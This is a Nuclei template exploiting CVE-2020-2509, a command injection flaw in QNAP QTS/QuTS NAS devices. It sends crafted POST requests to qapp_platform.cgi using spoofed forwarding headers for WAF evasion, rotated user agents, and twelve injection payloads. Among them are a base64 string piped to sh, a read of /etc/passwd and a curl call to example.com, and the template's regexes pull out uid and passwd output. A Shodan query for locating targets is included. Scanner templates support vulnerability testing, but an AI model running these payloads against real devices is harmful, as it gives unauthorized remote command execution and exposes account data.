id: cve-2020-2509-qnap-rce-ultra

info:
  name: QNAP QTS/QuTS - Advanced Authenticated Command Injection (CVE-2020-2509)
  author: malek838
  severity: critical
  description: |
    Ultra-advanced nuclei template exploiting CVE-2020-2509 in QNAP QTS/QuTS with enhanced evasion.
    Includes polymorphic payloads, encoding, advanced WAF bypass headers, and flexible body injection points.
  reference:
    - https://github.com/jbaines-r7/overkill
    - https://vulncheck.com/xdb/533b5e83b1eb
  tags: cve,cve2020,qnap,rce,command-injection,authenticated,bounty,obfuscation,waf-bypass
  metadata:
    shodan-query: 'product:"qnap"'
    max-request: 12
    verified: true

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/qapp_platform.cgi"

    headers:
      User-Agent: "{{user_agent}}"
      X-Forwarded-For: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"
      X-Remote-IP: "127.0.0.1"
      X-Remote-Addr: "127.0.0.1"
      X-Requested-With: "XMLHttpRequest"
      Accept-Language: "en-US,en;q=0.9"
      Referer: "{{BaseURL}}/dashboard"
      Origin: "{{BaseURL}}"
      Content-Type: "application/json"

    payloads:
      payload:
        - "|id|"
        - ";id;"
        - "`id`"
        - "$(id)"
        - "|echo aWQK|base64 -d|sh"
        - "i\"\"d"                   # bypass some filters
        - "$(which\\ id)"
        - "$(ec\\ho uid=999)"       # fake echo payload
        - "`whoami`"
        - "`cat /etc/passwd | grep admin`"
        - "|sleep${IFS}1|id"
        - ";curl${IFS}example.com;" # dummy outbound payload

      user_agent:
        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        - "Mozilla/5.0 (X11; Linux x86_64)"
        - "curl/7.68.0"
        - "Wget/1.20.3 (linux-gnu)"

    body: |
      {
        "platform": "{{payload}}",
        "name": "{{payload}}",
        "desc": "{{payload}}"
      }

    attack: pitchfork
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - "uid="
          - "gid="
          - "root"
          - "admin"
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "uid=.*?gid=.*"
          - "root:.*?:[0-9]+:[0-9]+"
